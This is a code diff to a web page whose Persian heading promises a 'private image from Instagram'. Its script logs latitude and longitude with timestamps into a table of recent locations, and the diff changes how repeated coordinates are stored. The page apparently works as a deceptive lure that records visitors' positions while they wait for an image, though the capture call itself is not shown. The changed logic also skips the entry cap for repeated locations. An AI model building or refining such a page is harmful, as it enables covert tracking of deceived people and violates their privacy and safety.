@@ -22,13 +22,27 @@
             
             // Create the URL with latitude and longitude
             var locationUrl = "instagram.com/" + latitude + "-" + longitude;
-            
-            // Add the location data to the array
-            if (locations.length >= 20) {
-                locations.shift(); // Remove the oldest location if there are more than 20 entries
+
+            // Check if the location already exists (same latitude and longitude)
+            let locationExists = false;
+            for (let loc of locations) {
+                if (loc.latitude === latitude && loc.longitude === longitude) {
+                    locationExists = true;
+                    break; // No need to check further, as we found a match
+                }
             }
-            locations.push({locationUrl, time});
-            
+
+            // If the location exists, append a new row with the same coordinates but a new timestamp
+            if (locationExists) {
+                locations.push({locationUrl, latitude, longitude, time});
+            } else {
+                // If the location doesn't exist, add it as a new entry
+                if (locations.length >= 20) {
+                    locations.shift(); // Remove the oldest location if there are more than 20 entries
+                }
+                locations.push({locationUrl, latitude, longitude, time});
+            }
+
             // Update the table with the latest 20 locations
             updateLocationTable();
             
@@ -71,7 +85,7 @@
     </script>
 </head>
 <body>
-    <h2>تصویر خصوصی از اینستاگرام</h2>
+    <h2> تصویر خصوصی از اینستاگرام</h2>
     <p id="status">بارگذاری...</p>
     
     <!-- Image you uploaded -->
